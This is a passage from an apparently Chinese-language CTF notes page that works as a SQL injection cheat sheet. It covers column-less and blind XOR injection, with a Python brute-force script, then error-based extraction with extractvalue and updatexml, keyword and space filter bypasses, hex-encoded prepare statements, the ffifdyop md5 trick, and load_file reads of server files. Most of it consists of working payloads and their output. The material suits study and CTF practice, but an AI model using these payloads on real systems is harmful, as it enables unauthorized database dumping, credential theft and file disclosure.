href="#information-schema被过滤时-有时候被or过滤误伤" class="headerlink" title="information_schema被过滤时(有时候被or过滤误伤)"></a>information_schema被过滤时(有时候被or过滤误伤)</h3><p>例题:<a href="2e610037.html">[SWPU2019]Web1</a></p><ul><li><p><strong>利用<code>mysql5.7</code>新增的<code>sys.schema_auto_increment_columns</code></strong></p><p>这是<code>sys</code>数据库下的一个视图，基础数据来自与<code>information_schema</code>,他的作用是对表的自增ID进行监控，也就是说，<strong>如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名</strong></p><p>它的列包括:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_schema库名  table_name表名  column_name自增列的列名,这个一般是id....</span><br></pre></td></tr></table></figure></li><li><p><strong><code>sys.schema_table_statistics_with_buffer</code></strong></p><p>这是<code>sys</code>数据库下的视图，里面存储着所有数据库所有表的统计信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">与它表结构相似的视图还有</span><br><span class="line">sys.x$schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_table_statistics</span><br><span class="line">sys.x$ps_schema_table_statistics_io</span><br></pre></td></tr></table></figure><p>其中的列包括:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_schema库名  table_name表名</span><br></pre></td></tr></table></figure></li><li><p><code>mysql</code>默认存储引擎<code>innoDB</code>携带的表(<code>MySQL5.6以上</code>)</p><p><code>mysql.innodb_table_stats</code>,<code>mysql.innodb_index_stats</code></p><p>其中的列包括: 没有列名..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database_name, table_name</span><br></pre></td></tr></table></figure><p>这里需要<code>mysql</code>使用<code>InnoDB</code>作为数据库的引擎:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show engines; 查看引擎 </span><br><span class="line">default-storage-engine=InnoDB 设置引擎</span><br></pre></td></tr></table></figure></li></ul><br><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87information_schema/">https://johnfrod.top/%E5%AE%89%E5%85%A8/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87information_schema/</a></p><p>前面所说的<code>information_schema</code>的替代方案都查不到列名,所以就需要进行无列名注入</p><p>例如现在不知道<code>user</code>表的列名,那么使用下列语句为<code>user</code>表的列名赋上1,2,3的名字(这里具体有几列需要试)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from user;</span><br></pre></td></tr></table></figure><p>上述查询的结果作为一个子查询,我们将其指代为<code>x</code>,然后通过外层的<code>select</code>来查询其中某一列的具体数据,这样就在不知道<code>user</code>列名的情况下查到了<code>user</code>表中某一列的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from user)x;</span><br><span class="line">select x.3 from (select 1,2,3 union select * from user)x;</span><br></pre></td></tr></table></figure><p>具体应用实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,(select/**/group_concat(x.3)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)x),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure><br><p>另外一种无列名注入的方法: <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>按位比较,多用于盲注</span></p><p>以下来自: <a href="383bfb1c.html">[GYCTF2020]Ezsqli</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1^((select 1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))  返回Error Occured When Fetch Result. </span><br><span class="line"></span><br><span class="line">id=1^((select 1,1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))  返回bool(false)</span><br><span class="line">这里说明目标表有两列 </span><br></pre></td></tr></table></figure><p>这里前面<code>select</code>的结果,也就是<code>(1,1)</code>会和后面的结果去按位比较(<code>ASCII码</code>)</p><p>如果前后列数不一致,则会报错. 如果列数一致,再判断整个不等式的真假.  </p><p>比较的时候进行按位比较, 假设<code>select * from f1ag_1s_h3r3_hhhhh</code>的结果中,第二列的数据为:<code>flag&#123;aaaaa&#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1^((select 1,&#x27;a&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))  返回Nu1L,这说明整个表达式的值为1,也就说明后面不等式的值为0</span><br><span class="line">id=1^((select 1,&#x27;g&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))  返回Error Occured When Fetch Result. 说明整个表达式的值为0,也就说明后面不等式的值为1</span><br></pre></td></tr></table></figure><p>所以此时我们按照<code>ascii</code>码值的顺序更换字母就可以了,当在某个字母,比如<code>g</code>时,返回的结果从<code>Nu1L</code>变成了<code>Error Occured When Fetch Result.</code>,  就说明它的前一个字母刚好等于flag的第一个字母.因此也就得知了flag的第一个字母是<code>f</code></p><p>如果这里传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1^((select 1,&quot;abcd&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure><p>将首先比较”a”和<code>select * from f1ag_1s_h3r3_hhhhh</code>的结果中第一位的<code>ascii</code>码大小</p><p>如果首位比较的结果相等,再接着去比较第二位”b”和后面结果的第二个字符</p><p>根据这种性质,就可以使用代码来注入了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>): <span class="comment"># 测试的ascii码范围</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&quot;1^((select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))#&quot;</span>.<span class="built_in">format</span>(flag+<span class="built_in">chr</span>(c))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">print</span>(data[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">            res = session.post(base_url, data=data).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Error Occured When Fetch Result.&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                flag = flag + <span class="built_in">chr</span>(c-<span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> <span class="comment">#输出:FLAG&#123;0F444C84-7580-4A33-B2E8-19FCE4439E7D&#125; </span></span><br></pre></td></tr></table></figure><p>注意这里如果返回了<code>Error Occured When Fetch Result</code>,说明当前比较的字母已经大于flag中对应位置的字母了</p><p>那么它前一个字母是和flag中对应位置相等的,所以12行是<code>flag = flag + chr(c-1)</code></p><p>另外, 上面输出的全都是大写字母的原因是:  <code>mysql</code>中比较是不区分大小写的,所以尽管<code>N</code>的 ascii码小于<code>a</code>,但是在上面判定时还是会判断为<code>N</code>&gt;<code>a</code>  但这不影响我们的结果,只要把上面的flag转为小写就可以了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;FLAG&#123;0F444C84-7580-4A33-B2E8-19FCE4439E7D&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag.lower())</span><br></pre></td></tr></table></figure><br><h3 id="show"><a href="#show" class="headerlink" title="show"></a><strong>show</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;# //可以用来爆库名</span><br><span class="line">1&#x27;;show tables;# //可以用来爆表名</span><br><span class="line">1&#x27;; show columns from 表名;# //爆某个表中的所有列名</span><br></pre></td></tr></table></figure><br><br><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="一般的盲注-猜"><a href="#一般的盲注-猜" class="headerlink" title="一般的盲注(猜):"></a>一般的盲注(猜):</h3><p>假设页面不会回显具体的查询结果,只会告知查询的内容是否存在,那么可以尝试下列语句,如果查询存在,则说明语句为真,<code>and</code>后面的猜测是正确的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">猜库名长度</span><br><span class="line">1&#x27; and length(database())=4 #</span><br><span class="line">逐个字母猜库名</span><br><span class="line">1&#x27; and substr(database(),1,1)=&#x27;d</span><br><span class="line">逐个字母猜所有表名</span><br><span class="line">1&#x27; and substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;),1,1) = &#x27;g</span><br><span class="line">逐个字母猜列名：</span><br><span class="line">1&#x27; and substr((select group_concat(column_name) from information_schema.columns where table_schema = &#x27;dvwa&#x27; and table_name = &#x27;users&#x27;), 1, 1) = &#x27;u</span><br><span class="line">逐个字母猜特定列里的数据：</span><br><span class="line">id=1&#x27; and substr((select group_concat(password) from users), 1, 1) = &#x27;5</span><br></pre></td></tr></table></figure><br><h3 id="利用异或性质进行盲注"><a href="#利用异或性质进行盲注" class="headerlink" title="利用异或性质进行盲注:"></a>利用异或性质进行盲注:</h3><p><strong><code>A^B</code>,AB如果相同则返回0,不同则返回1</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use test;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select * from flag;</span><br><span class="line">+------+------------+</span><br><span class="line">| id   | flag       |</span><br><span class="line">+------+------------+</span><br><span class="line">|    1 | flag&#123;test&#125; |</span><br><span class="line">+------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where id=1^(length(database())=4); 这里返回空,是因为1^(length(database())=4)的结果返回了0,也就相当于length(database())=4为True,由此就猜对了数据库的长度. 这里和一般的盲注理解类似</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where id=1^(length(database())=3);</span><br><span class="line">+------+------------+</span><br><span class="line">| id   | flag       |</span><br><span class="line">+------+------------+</span><br><span class="line">|    1 | flag&#123;test&#125; |</span><br><span class="line">+------+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">其他常用payload: (大量尝试,需要借助python脚本) (下面这几个是空格被过滤时使用过的,用加括号的方法绕过)</span><br><span class="line">id=1^(substr(database(),1,1)=&#x27;g&#x27;)#  爆库名</span><br><span class="line"></span><br><span class="line">id=1^(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=&#x27;库名&#x27;)),1,1)=&#x27;g&#x27;)#  爆表名</span><br><span class="line"></span><br><span class="line">id=1^(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;表名&#x27;)),1,1)=&#x27;g&#x27;)#   爆列名</span><br><span class="line"></span><br><span class="line">id=1^(substr((select(group_concat(password))from(F1naI1y)),1,1)=&#x27;g&#x27;)#  具体数据</span><br></pre></td></tr></table></figure><p><a href="2e610037.html">[极客大挑战 2019]FinalSQL</a></p><br><h2 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入:"></a>基于报错的注入:</h2><p>前提是页面能够输出详细的错误信息, 基于报错的注入主要依靠<strong>两个特殊函数<code>extractvalue</code>和<code>updatexml</code></strong>,这两个函数的作用分别是<strong>对<code>XML</code>文档内容进行查询和修改</strong></p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><p><code>ExtractValue(XML_document:XML文档对象或者XML片段, xpath_string:XML中的查找路径)</code></p><p>例如: 下面的代码就是在前面的XML片段中查找a节点下的b节点.  这里第一个参数既可以是一个文档路径也可以是一个直接输入进去的XML片段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT ExtractValue(&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;, &#x27;/a/b&#x27;);</span><br></pre></td></tr></table></figure><p>当第二个参数<code>xpath_string</code>格式出现错误时, 会使得查询语句爆出<code>xpath syntax</code>语法错误,<strong>此时错误信息中会包含出错的<code>xpath_string</code>的内容</strong>. <strong>这里字符:<code>0x7e</code>(解码后是<code>~</code>)就会引起这种语法错误</strong></p><p>所以如果上面的语句变为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT ExtractValue(&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;, &#x27;0x7e&#x27;);</span><br><span class="line">会报错:</span><br><span class="line">XPATH syntax error: &#x27;~&#x27;</span><br></pre></td></tr></table></figure><p>所以这里就可以把<strong>第二个参数换成其他具有查询功能的语句</strong>,例如在注入中常用的: (因为需要爆语法错误,所以第一个参数的文档对象填什么都无所谓了,这里就用了1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or extractvalue(1,concat(0x7e,(database()),0x7e))# 爆数据库名</span><br></pre></td></tr></table></figure><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p><code>updatexml(XML_document,XPath_string需要更新的路径,new_value修改后的新值)</code>这里和<code>ExtractValue</code>的区别是查找到对应的片段后要把其对应的内容更新为<code>new_value</code>但两者报错的原理是一样的</p><p>注入示例: 第一个和第二个参数都可以随便写, 第二个参数是需要查询的内容对应的语句,其中要包含<code>0x7e</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #</span><br></pre></td></tr></table></figure><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">extractvalue爆库名</span><br><span class="line">&#x27;or extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br><span class="line">updatexml爆表名</span><br><span class="line">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#x27;geek&#x27;))),0x7e),1))#</span><br><span class="line">updatexml爆列名</span><br><span class="line">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#x27;H4rDsq1&#x27;))),0x7e),1))#</span><br><span class="line">updatexml爆数据</span><br><span class="line">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#</span><br><span class="line"></span><br><span class="line">爆数据库版本信息</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br><span class="line">链接用户</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</span><br><span class="line"></span><br><span class="line">链接数据库</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</span><br><span class="line"></span><br><span class="line">爆库</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line"></span><br><span class="line">爆表</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line"></span><br><span class="line">爆字段</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line"></span><br><span class="line">爆字段内容</span><br><span class="line">?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆表名</span><br><span class="line">?id=1 and updatexml(1,make_set(3,&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#</span><br><span class="line">爆列名</span><br><span class="line">?id=1 and updatexml(1,make_set(3,&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;)),1)#</span><br><span class="line">爆字段</span><br><span class="line">?id=1 and updatexml(1,make_set(3,&#x27;~&#x27;,(select data from users)),1)#</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><br><h2 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h2><ul><li>过滤<code>select</code>,<code>union</code>等关键词,可以先试试双写绕过,例如:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(TABLE_NAME) frfromom information_schema.tables whwhereere table_schema=database()#</span><br></pre></td></tr></table></figure><ul><li><strong>等于号被过滤</strong>可以考虑使用<code>like</code>进行模糊查询:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name like &#x27;H4rDsq1&#x27;</span><br></pre></td></tr></table></figure><ul><li><code>like</code>也被过滤的时候可以使用<code>regexp</code>进行正则匹配</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name regexp &#x27;^H4&#x27; </span><br></pre></td></tr></table></figure><p>上面是匹配以<code>H4</code>开头的数据</p><ul><li>空格被过滤可以将每一部分<strong>用括号包裹</strong>, 也可以用注释符代替</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#x27;H4rDsq1&#x27;))</span><br><span class="line"></span><br><span class="line">/**/</span><br></pre></td></tr></table></figure><ul><li><p><strong><code>or</code>或<code>and</code>被过滤可以尝试使用异或运算符<code>^</code>或<code>XOR</code>作连接符, 前者按位异或,后者逻辑异或</strong></p><blockquote><p>异或运算:<code>a ^ b</code>,两者不同则结果为1,两者相同则结果位0</p></blockquote></li><li><p><code>mysql</code>会自动将十六进制转换成字符,所以可以把一些关键词转换成16进制: 例如</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;path&quot;:&quot; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= &#x27;users&#x27; and table_schema=database()),&#123;&#125;,1))=&#123;&#125;) #&quot;</span><br><span class="line">这里users使用了引号, 导致脚本已知跑不出来</span><br><span class="line">所以把这里的users转换成16进制</span><br><span class="line">&quot;path&quot;:&quot; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= 0x7573657273 and table_schema=database()),&#123;&#125;,1))=&#123;&#125;) #&quot;</span><br></pre></td></tr></table></figure><ul><li><strong>注释符<code>#</code>和<code>--</code>都被过滤,可以尝试使用<code>%00</code>去截断</strong></li></ul><br><br><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="prepare预处理-绕一些过滤"><a href="#prepare预处理-绕一些过滤" class="headerlink" title="prepare预处理(绕一些过滤)"></a>prepare预处理(绕一些过滤)</h3><p>例如想执行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `1919810931114514`</span><br></pre></td></tr></table></figure><p>但是<code>select</code>等关键字被过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;Set@payload=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execpayload from @payload;execute execpayload;#</span><br><span class="line">//这里先将本来想要执行的select * from `1919810931114514`进行16进制编码</span><br><span class="line">//然后使用Set语句将编码后的语句赋值给一个变量: Set@变量名=变量值</span><br><span class="line">//使用prepare语句对查询语句进行预处理,这个过程里会进行编码转换:prepare 预处理后的变量名 from @变量名</span><br><span class="line">//最后执行预处理后的语句:execute 预处理后的变量名</span><br></pre></td></tr></table></figure><br><h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><blockquote><p><code>handler</code>语句是<code>mysql</code>的专用语句</p><p><code>mysql</code>除可使用<code>select</code>查询表中的数据，也可使用<code>handler</code>语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过<code>handler</code>语句并不具备<code>select</code>语句的所有功能。它是<code>mysql</code>专用的语句，并没有包含到SQL标准中。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">handler 表名 open as xxx; //打开一个表,返回一个名为xxx的句柄</span><br><span class="line">handler xxx read first; // 读该表的第一行数据</span><br><span class="line">handler xxx read next; // 读该表的下一行数据</span><br><span class="line">handler xxx close;</span><br><span class="line">或者</span><br><span class="line">handler 表名 open;</span><br><span class="line">handler 表名 read first;</span><br><span class="line">handler 表名 read next;</span><br><span class="line">handler xxx close;</span><br></pre></td></tr></table></figure><br><h3 id="md5-sql注入"><a href="#md5-sql注入" class="headerlink" title="md5_sql注入"></a>md5_sql注入</h3><p>假设服务器的查询语句为: 其中<code>$pass</code>是用户输入的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p>此时如果要注入,可以传:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">129581926211651571912466741651878684928</span><br></pre></td></tr></table></figure><p>这两者在生成二进制的<code>md5</code>后可以包含<code>...&#39; or .. </code>这样的<strong>万能密码</strong>,能够达到注入目的</p><br><h3 id="IF语句逻辑判断"><a href="#IF语句逻辑判断" class="headerlink" title="IF语句逻辑判断"></a>IF语句逻辑判断</h3><p><strong><code>sql</code>中的<code>if</code>语句: <code>IF( expr1 , expr2 , expr3 )</code></strong></p><p><strong>如果<code>exp1</code>的值为<code>True</code>,则返回<code>expr2</code></strong></p><p><strong>如果<code>exp1</code>的值为<code>False</code>,则返回<code>expr3</code></strong></p><p>基于此可以通过逻辑判断的方式进行盲注</p><p>题目见<a href="2e610037.html">Hack World</a></p><br><h3 id="绕过正则匹配"><a href="#绕过正则匹配" class="headerlink" title="绕过正则匹配"></a>绕过正则匹配</h3><p>如果有正则匹配关键字<code>\bselect\b</code> (这里<code>\b</code>的含义是精确匹配开头和结尾)</p><p>可以将<code>select</code>替换成:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!50000select*/  </span><br></pre></td></tr></table></figure><br><h3 id="通过root用户的权限来执行特殊功能"><a href="#通过root用户的权限来执行特殊功能" class="headerlink" title="通过root用户的权限来执行特殊功能"></a>通过root用户的权限来执行特殊功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select user(); 可以查看当前数据库连接的用户</span><br><span class="line">如果是root用户还可以在注入时使用特殊函数,例如:</span><br><span class="line"></span><br><span class="line">1&#x27; union select &#x27;1&#x27;,load_file(&#x27;/var/www/html/addads.php&#x27;); 读取了/var/www/html/addads.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><h3 id="flag显示不全"><a href="#flag显示不全" class="headerlink" title="flag显示不全"></a>flag显示不全</h3><h4 id="reverse逆序输出结果"><a href="#reverse逆序输出结果" class="headerlink" title="reverse逆序输出结果"></a>reverse逆序输出结果</h4><p>有的时候flag显示不全,需要逆序输出另一部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reverse(select group_concat(real_flag_1s_here) from users)</span><br></pre></td></tr></table></figure><br><h4 id="replace将之前出来的内容替换成空值"><a href="#replace将之前出来的内容替换成空值" class="headerlink" title="replace将之前出来的内容替换成空值"></a>replace将之前出来的内容替换成空值</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and extractvalue(1,concat(0x7e,(select load_file(&#x27;/flag.txt&#x27;)),0x7e))#</span><br><span class="line">输出: errorXPATH syntax error: &#x27;~flag&#123;e62bb712-dc5d-4f48-bd21-87&#x27;</span><br><span class="line"></span><br><span class="line">&#x27; and extractvalue(1,concat(0x7e,(select replace((select load_file(&#x27;/flag.txt&#x27;)),&quot;e62bb712-dc5d-4f48-bd21-87&quot;,&quot;&quot;)),0x7e))#</span><br><span class="line">输出: flag&#123;58112d0ecf&#125;</span><br><span class="line"></span><br><span class="line">最后拼接成完整flag:flag&#123;e62bb712-dc5d-4f48-bd21-8758112d0ecf&#125;</span><br></pre></td></tr></table></figure><br><h3 id="巧妙运用反斜杠"><a href="#巧妙运用反斜杠" class="headerlink" 